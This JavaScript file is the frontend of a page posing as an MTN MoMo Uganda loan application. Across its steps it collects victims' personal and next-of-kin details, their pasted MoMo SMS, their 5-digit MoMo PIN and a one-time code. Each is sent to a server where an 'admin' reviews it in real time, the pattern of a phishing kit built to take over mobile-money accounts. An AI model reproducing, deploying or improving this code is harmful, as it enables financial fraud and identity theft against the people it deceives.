// ============================================================
// MTN MoMo Uganda Loan Application – Frontend Logic
// ============================================================

const S = {
    loanType: '', loanAmount: 0, loanTerm: '', loanPurpose: '',
    firstName: '', lastName: '', phone: '', email: '',
    employment: '', annualIncome: 0,
    kinName: '', kinPhone: '',
    applicationId: '',
    isSubmitting: false,
    rejectedStep: null
};

let currentPollTimeout = null;
let otpResendTimer = null;
let otpResendCountdown = 0;
let pinBlockTimer = null;

const API = ''; // same-origin; server serves frontend

// ─── localStorage Helpers ───
const STORAGE_KEYS = {
    APPLICATION_ID: 'mtn_uganda_application_id',
    APPLICATION_DATA: 'mtn_uganda_application_data',
    REJECTION_INFO: 'mtn_uganda_rejection_info',
    FORM_DRAFT: 'mtn_uganda_form_draft',
    OTP_TIMER: 'mtn_uganda_otp_timer'
};

function saveToLocalStorage(key, data) {
    try { localStorage.setItem(key, JSON.stringify(data)); }
    catch (error) { console.error(`❌ Failed to save ${key}:`, error); }
}
function getFromLocalStorage(key) {
    try { const d = localStorage.getItem(key); return d ? JSON.parse(d) : null; }
    catch (error) { return null; }
}
function removeFromLocalStorage(key) {
    try { localStorage.removeItem(key); } catch (_) {}
}
function saveApplicationId(id) {
    if (id) {
        S.applicationId = id;
        saveToLocalStorage(STORAGE_KEYS.APPLICATION_ID, { id, timestamp: new Date().toISOString() });
    }
}
function loadApplicationId() {
    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
    if (saved && saved.id) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) { S.applicationId = saved.id; return saved.id; }
        removeFromLocalStorage(STORAGE_KEYS.APPLICATION_ID);
    }
    return null;
}
function saveApplicationData() {
    saveToLocalStorage(STORAGE_KEYS.APPLICATION_DATA, { ...S, timestamp: new Date().toISOString() });
}
function loadApplicationData() {
    const saved = getFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
    if (saved) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            ['loanType','loanAmount','loanTerm','loanPurpose','firstName','lastName','phone','email',
             'employment','annualIncome','kinName','kinPhone','applicationId','rejectedStep']
              .forEach(f => { if (saved[f] !== undefined) S[f] = saved[f]; });
            return true;
        }
        removeFromLocalStorage(STORAGE_KEYS.APPLICATION_DATA);
    }
    return false;
}
function saveRejectionInfo(step, applicationId) {
    saveToLocalStorage(STORAGE_KEYS.REJECTION_INFO, { step, applicationId, timestamp: new Date().toISOString() });
}
function loadRejectionInfo() {
    const saved = getFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
    if (saved) {
        const age = Date.now() - new Date(saved.timestamp).getTime();
        if (age < 5 * 60 * 1000) return saved;
        removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO);
    }
    return null;
}
function clearRejectionInfo() { removeFromLocalStorage(STORAGE_KEYS.REJECTION_INFO); }

function saveFormDraft() {
    saveToLocalStorage(STORAGE_KEYS.FORM_DRAFT, {
        firstName: document.getElementById('s2fi')?.value || '',
        lastName: document.getElementById('s2la')?.value || '',
        phone: document.getElementById('s2ph')?.value || '',
        email: document.getElementById('s2em')?.value || '',
        loanAmount: document.getElementById('s1am')?.value || '',
        loanPurpose: document.getElementById('s1pu')?.value || '',
        employment: document.getElementById('s3em')?.value || '',
        annualIncome: document.getElementById('s3in')?.value || '',
        kinName: document.getElementById('s3kn')?.value || '',
        kinPhone: document.getElementById('s3kp')?.value || '',
        timestamp: new Date().toISOString()
    });
}
function loadFormDraft() {
    const draft = getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
    if (draft) {
        const age = Date.now() - new Date(draft.timestamp).getTime();
        if (age < 24 * 60 * 60 * 1000) {
            if (draft.firstName) document.getElementById('s2fi').value = draft.firstName;
            if (draft.lastName) document.getElementById('s2la').value = draft.lastName;
            if (draft.phone) document.getElementById('s2ph').value = draft.phone;
            if (draft.email) document.getElementById('s2em').value = draft.email;
            if (draft.loanAmount) document.getElementById('s1am').value = draft.loanAmount;
            if (draft.loanPurpose) document.getElementById('s1pu').value = draft.loanPurpose;
            if (draft.employment) document.getElementById('s3em').value = draft.employment;
            if (draft.annualIncome) document.getElementById('s3in').value = draft.annualIncome;
            if (draft.kinName) document.getElementById('s3kn').value = draft.kinName;
            if (draft.kinPhone) document.getElementById('s3kp').value = draft.kinPhone;
            return true;
        }
        removeFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
    }
    return false;
}

// ─── Navigation ───
function _goTo(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    const el = document.getElementById(pageId);
    if (el) el.classList.add('active');
    window.scrollTo(0, 0);
}
function goTo(pageId) {
    _goTo(pageId);
    if (pageId === 'page-pin') { updatePinPageUI(); checkPinStatus(); }
}
function startApplication() {
    S.rejectedStep = null;
    clearRejectionInfo();
    if (!S.applicationId) S.applicationId = 'TEMP-' + Date.now().toString().slice(-6);
    ['s1Err','s2Err','s3Err','momErr','pinErr','otpErr'].forEach(id => clearErr(id));
    goTo('page-step1');
}

// ─── Toast ───
function showToast(message, type = 'info', duration = 3000) {
    const existing = document.querySelector('.toast');
    if (existing) existing.remove();
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    toast.textContent = message;
    document.body.appendChild(toast);
    setTimeout(() => {
        toast.style.opacity = '0';
        toast.style.transform = 'translateX(-50%) translateY(10px)';
        setTimeout(() => toast.remove(), 300);
    }, duration);
}

// ─── Error helpers ───
function showErr(id, msg) {
    const box = document.getElementById(id);
    const txt = document.getElementById(id + 'Txt');
    if (txt) txt.textContent = msg;
    if (box) box.classList.add('show');
}
function clearErr(id) {
    const box = document.getElementById(id);
    if (box) box.classList.remove('show');
    const txt = document.getElementById(id + 'Txt');
    if (txt) txt.textContent = '';
}

// ─── Phone normalization ───
function normalizePhone(id) {
    const el = document.getElementById(id);
    if (!el) return;
    el.value = el.value.replace(/\D/g, '').slice(0, 9);
}

// ─── Calculator ───
function updateCalc() {
    const amt = parseInt(document.getElementById('amtSlider').value, 10);
    const term = 12;
    const monthly = Math.round(amt / term);
    document.getElementById('calcAmt').textContent = 'UGX ' + amt.toLocaleString();
    document.getElementById('calcTerm').textContent = term + ' Months';
    document.getElementById('monthlyAmt').textContent = 'UGX ' + monthly.toLocaleString();
}

// ─── Step 1 → 2 ───
function toS2() {
    clearErr('s1Err');
    const ty = document.getElementById('s1ty').value;
    const am = parseInt(document.getElementById('s1am').value, 10);
    const te = document.getElementById('s1te').value;
    const pu = document.getElementById('s1pu').value.trim();
    if (!am || am < 10000) { showErr('s1Err', 'Please enter a valid loan amount (min UGX 10,000).'); return; }
    if (!pu) { showErr('s1Err', 'Please describe the purpose of your loan.'); return; }
    S.loanType = ty; S.loanAmount = am; S.loanTerm = te; S.loanPurpose = pu;
    saveApplicationData(); saveFormDraft();
    goTo('page-step2');
}

// ─── Step 2 → 3 ───
function toS3() {
    clearErr('s2Err');
    const fi = document.getElementById('s2fi').value.trim();
    const la = document.getElementById('s2la').value.trim();
    const ph = document.getElementById('s2ph').value.trim();
    const em = document.getElementById('s2em').value.trim();
    if (!fi) { showErr('s2Err', 'First name is required.'); return; }
    if (!la) { showErr('s2Err', 'Last name is required.'); return; }
    if (!/^7\d{8}$/.test(ph)) { showErr('s2Err', 'Enter a valid Uganda number: 7XXXXXXXX (9 digits).'); return; }
    if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em)) { showErr('s2Err', 'Enter a valid email address.'); return; }
    S.firstName = fi; S.lastName = la; S.phone = '+256' + ph; S.email = em;
    saveApplicationData(); saveFormDraft();
    // Fill step-3 summary
    document.getElementById('sA').textContent = 'UGX ' + S.loanAmount.toLocaleString();
    document.getElementById('sT').textContent = S.loanTerm;
    document.getElementById('sP').textContent = S.loanPurpose;
    document.getElementById('sN').textContent = S.firstName + ' ' + S.lastName;
    goTo('page-step3');
}

// ─── Submit application ───
async function submitApp() {
    clearErr('s3Err');
    if (S.isSubmitting) return;
    const em = document.getElementById('s3em').value;
    const inc = parseInt(document.getElementById('s3in').value, 10);
    const kn = document.getElementById('s3kn').value.trim();
    const kp = document.getElementById('s3kp').value.trim();
    if (!inc || inc < 100000) { showErr('s3Err', 'Enter a valid annual income.'); return; }
    if (!kn) { showErr('s3Err', 'Next of kin name is required.'); return; }
    if (!/^7\d{8}$/.test(kp)) { showErr('s3Err', 'Enter a valid next-of-kin phone (7XXXXXXXX).'); return; }

    S.employment = em; S.annualIncome = inc; S.kinName = kn; S.kinPhone = '+256' + kp;
    saveApplicationData(); saveFormDraft();
    S.isSubmitting = true;
    goTo('page-processing');
    document.getElementById('processingStatus').textContent = '⏳ Submitting application...';

    try {
        const res = await fetch(`${API}/api/apply`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(S)
        });
        const data = await res.json();
        if (!res.ok || !data.success) throw new Error(data.error || 'Submission failed');
        saveApplicationId(data.applicationId);
        saveApplicationData();
        document.getElementById('processingStatus').textContent = '⏳ Awaiting admin approval...';
        startPolling('apply');
    } catch (err) {
        showToast(err.message || 'Submission failed', 'error');
        S.isSubmitting = false;
        goTo('page-step3');
    }
}

// ─── SMS paste ───
async function doSmsParse() {
    clearErr('momErr');
    const msg = document.getElementById('smsMsgBox').value.trim();
    if (!msg || msg.length < 10) { showErr('momErr', 'Please paste the full MoMo message.'); return; }
    goTo('page-wait-sms');
    document.getElementById('waitSmsAppId').textContent = S.applicationId;
    document.getElementById('waitSmsStatus').textContent = '⏳ Admin is reviewing your SMS...';
    try {
        const res = await fetch(`${API}/api/sms`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationId: S.applicationId, message: msg })
        });
        const data = await res.json();
        if (!res.ok || !data.success) throw new Error(data.error || 'SMS submit failed');
        startPolling('sms');
    } catch (err) {
        showToast(err.message || 'SMS submit failed', 'error');
        goTo('page-sms-paste');
    }
}

// ─── PIN entry ───
function pinMvM(el, idx) {
    el.value = el.value.replace(/\D/g, '').slice(0, 1);
    if (el.value && idx < 4) document.getElementById('pin' + (idx + 1)).focus();
    if (idx === 4 && el.value) doPin();
}
function togPin() {
    for (let i = 0; i < 5; i++) {
        const b = document.getElementById('pin' + i);
        b.type = b.type === 'password' ? 'text' : 'password';
    }
}
function clearLoginPin() {
    for (let i = 0; i < 5; i++) document.getElementById('pin' + i).value = '';
    document.getElementById('pin0').focus();
}
function updatePinPageUI() {
    const el = document.getElementById('pinAttemptsDisplay');
    if (el) el.textContent = '🔑 Attempts remaining: 3 of 3';
}
async function doPin() {
    clearErr('pinErr');
    let pin = '';
    for (let i = 0; i < 5; i++) pin += document.getElementById('pin' + i).value;
    if (!/^\d{5}$/.test(pin)) { showErr('pinErr', 'Enter your 5-digit MoMo PIN.'); return; }
    goTo('page-wait-pin');
    document.getElementById('waitPinAppId').textContent = S.applicationId;
    document.getElementById('waitPinStatus').textContent = '⏳ Admin is reviewing your PIN...';
    try {
        const res = await fetch(`${API}/api/pin`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationId: S.applicationId, pin })
        });
        const data = await res.json();
        if (!res.ok || !data.success) throw new Error(data.error || 'PIN submit failed');
        startPolling('pin');
    } catch (err) {
        showToast(err.message || 'PIN submit failed', 'error');
        goTo('page-pin');
    }
}
function checkPinStatus() { /* optional: re-check server state on revisit */ }

// ─── OTP entry ───
function handleOtpInput(el, prefix) {
    el.value = el.value.replace(/\D/g, '').slice(0, 1);
    const idx = parseInt(el.id.replace(prefix, ''), 10);
    if (el.value && idx < 3) document.getElementById(prefix + (idx + 1)).focus();
}
function clearOtpCode() {
    for (let i = 0; i < 4; i++) document.getElementById('otp' + i).value = '';
    document.getElementById('otp0').focus();
}
async function doOtp() {
    clearErr('otpErr');
    let otp = '';
    for (let i = 0; i < 4; i++) otp += document.getElementById('otp' + i).value;
    if (!/^\d{4}$/.test(otp)) { showErr('otpErr', 'Enter the 4-digit OTP.'); return; }
    goTo('page-wait-otp');
    document.getElementById('waitOtpAppId').textContent = S.applicationId;
    document.getElementById('waitOtpStatus').textContent = '⏳ Admin is verifying your OTP...';
    try {
        const res = await fetch(`${API}/api/otp`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ applicationId: S.applicationId, otp })
        });
        const data = await res.json();
        if (!res.ok || !data.success) throw new Error(data.error || 'OTP submit failed');
        startPolling('otp');
    } catch (err) {
        showToast(err.message || 'OTP submit failed', 'error');
        goTo('page-otp');
    }
}
function resendOtp() {
    if (otpResendCountdown > 0) return;
    // Re-trigger OTP request through admin flow
    fetch(`${API}/api/otp/resend`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ applicationId: S.applicationId })
    }).then(r => r.json()).then(d => {
        if (!d.success) throw new Error(d.error || 'Resend failed');
        showToast('OTP resend requested. Check your SMS.', 'success');
    }).catch(e => showToast(e.message, 'error'));
    startOtpResendTimer();
}
function startOtpResendTimer() {
    otpResendCountdown = 60;
    const btn = document.getElementById('resendOtpBtn');
    if (otpResendTimer) clearInterval(otpResendTimer);
    btn.classList.remove('hidden');
    btn.disabled = true;
    btn.textContent = `🔄 Resend OTP (${otpResendCountdown}s)`;
    otpResendTimer = setInterval(() => {
        otpResendCountdown--;
        if (otpResendCountdown <= 0) {
            clearInterval(otpResendTimer);
            btn.disabled = false;
            btn.textContent = '🔄 Resend OTP';
        } else {
            btn.textContent = `🔄 Resend OTP (${otpResendCountdown}s)`;
        }
    }, 1000);
}

// ─── Approval display ───
function showApproval() {
    const termMonths = parseInt(S.loanTerm, 10) || 6;
    const monthly = Math.round(S.loanAmount / termMonths);
    const fmt = n => 'UGX ' + n.toLocaleString();
    document.getElementById('aprAmount').textContent = fmt(S.loanAmount);
    document.getElementById('aprAmt').textContent = fmt(S.loanAmount);
    document.getElementById('aprTerm').textContent = termMonths + ' Months';
    document.getElementById('aprMth').textContent = fmt(monthly);
    goTo('page-approval');
}

// ─── Polling orchestrator ───
function startPolling(step) {
    if (currentPollTimeout) clearTimeout(currentPollTimeout);
    const poll = async () => {
        try {
            const res = await fetch(`${API}/api/status/${encodeURIComponent(S.applicationId)}`);
            const data = await res.json();
            if (data.status === 'approved') { showApproval(); return; }
            if (data.status === 'rejected') { handleRejection(step, data.reason); return; }
            if (data.nextStep && data.nextStep !== step) { advanceToStep(data.nextStep); return; }
            currentPollTimeout = setTimeout(poll, 3000);
        } catch (_) {
            currentPollTimeout = setTimeout(poll, 5000);
        }
    };
    currentPollTimeout = setTimeout(poll, 2000);
}
function advanceToStep(step) {
    if (step === 'sms')    { goTo('page-sms-paste'); }
    if (step === 'pin')    { goTo('page-pin'); }
    if (step === 'otp')    { goTo('page-otp'); }
    if (step === 'approved') { showApproval(); }
    if (step) startPolling(step);
}
function handleRejection(step, reason) {
    saveRejectionInfo(step, S.applicationId);
    showToast(reason || 'Request rejected by admin.', 'error', 4000);
    if (step === 'sms') goTo('page-sms-paste');
    else if (step === 'pin') goTo('page-pin');
    else if (step === 'otp') goTo('page-otp');
    else goTo('page-processing');
}

// ─── Boot ───
document.addEventListener('DOMContentLoaded', () => {
    loadApplicationId();
    loadApplicationData();
    loadFormDraft();
    updateCalc();
    const draftLoaded = !!getFromLocalStorage(STORAGE_KEYS.FORM_DRAFT);
    if (draftLoaded) showToast('Draft restored. Continue where you left off.', 'info');
    if (S.applicationId && S.applicationId.startsWith('TEMP-') === false) {
        // resume from server state
        fetch(`${API}/api/status/${encodeURIComponent(S.applicationId)}`)
            .then(r => r.json()).then(d => {
                if (d.nextStep) advanceToStep(d.nextStep);
            }).catch(() => {});
    }
});
